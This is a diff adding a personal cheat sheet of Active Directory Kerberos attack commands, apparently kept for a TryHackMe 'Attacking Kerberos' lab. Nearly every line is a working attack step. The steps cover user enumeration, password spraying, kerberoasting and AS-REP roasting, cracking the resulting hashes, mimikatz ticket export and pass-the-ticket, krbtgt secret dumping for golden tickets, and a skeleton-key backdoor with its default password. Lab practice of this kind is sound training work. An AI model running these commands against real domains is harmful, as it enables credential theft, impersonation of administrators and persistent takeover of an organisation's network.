@@ -1,0 +1,64 @@
+### kerberos ###
+## links
+https://tryhackme.com/room/attackingkerberos
+
+
+## enum
+cd /home/tristan/perso/secu/win/AD/
+./kerbrute_linux_amd64 userenum --dc $h -d spookysec.local ad-user-mid.txt
+./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local ad-user-mid.txt
+
+
+## harvesting
+Rubeus.exe harvest /interval:30
+
+
+## bruteforce/spray
+echo 10.10.62.227 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+Rubeus.exe brute /password:Password1 /noticket
+
+
+## kerberoasting
+Rubeus.exe kerberoast							# dump hash of kerberoastable users
+GetUserSPNs.py -request -dc-ip $h controller.local/Machine1:Password1	# impacket
+# crack
+hashcat -m 13100 -a 0 hash.txt ~/perso/secu/dict/rockyou.txt
+john out --wordlist=~/perso/secu/dict/rockyou.txt --format=krb5tgs
+
+
+## ASREP
+Rubeus.exe asreproast							# collect
+GetNPUsers.py -request -usersfile found-user.txt -dc-ip $h $d/		# impacket
+# crack
+john out --wordlist=~/perso/secu/dict/rockyou.txt --format=krb5asrep
+# MODE 18200 => Kerberos 5 AS-REP etype 23 => hashcat
+hashcat -m 18200 out ~/perso/secu/dict/rockyou.txt                      # insert 23$ if needed in hash
+
+
+## mimikatz
+mimikatz.exe
+privilege::debug
+sekurlsa::tickets /export						# export all .kirbi tickets
+# pass the ticket
+kerberos::ppt <ticket>
+kerberos::ppt [0;2b3c3c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+# quit mimikatz
+klist									# verif sucess to impersonate ticket
+
+
+## silver/golden ticket
+mimikatz.exe
+privilege::debug
+lsadump::lsa /inject /name:krbtgt
+lsadump::lsa /inject /name:Administrator
+lsadump::lsa /inject /name:SQLService
+
+
+## backdoor
+mimikatz.exe
+privilege::debug
+misc:skeleton								# default cred: mimikatz
+example> net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
+example> dir \\Desktop-1\c$ /user:Machine1 mimikatz
+
+
